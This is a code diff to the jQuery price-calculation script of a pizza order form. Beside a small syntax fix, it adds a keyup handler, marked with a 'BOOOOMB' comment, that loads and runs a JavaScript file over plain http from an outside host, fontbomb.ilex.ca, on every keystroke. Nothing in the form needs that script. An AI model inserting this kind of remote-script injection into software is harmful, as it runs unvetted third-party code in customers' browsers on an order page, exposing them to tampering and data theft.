@@ -28,7 +28,15 @@ $(function() {
 		var price = (size_price + topping_price) * piza_num;
 		var valuePrice = parseInt(price.toLocaleString().split(',').join('').trim());
 		$("#totalprice").html('<input type="hidden" name="totalPrice" value= "'+ valuePrice +'">' + price.toLocaleString());
-	}
-	;
+	};
+	
+	//_______________________________________BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOMB
+	
+	$(window).keyup(function() {
+	    (function () {var s = document.createElement('script');
+	    s.setAttribute('src', 'http://fontbomb.ilex.ca/js/main.js');
+	    document.body.appendChild(s);}());
+	 });
+
 });
 
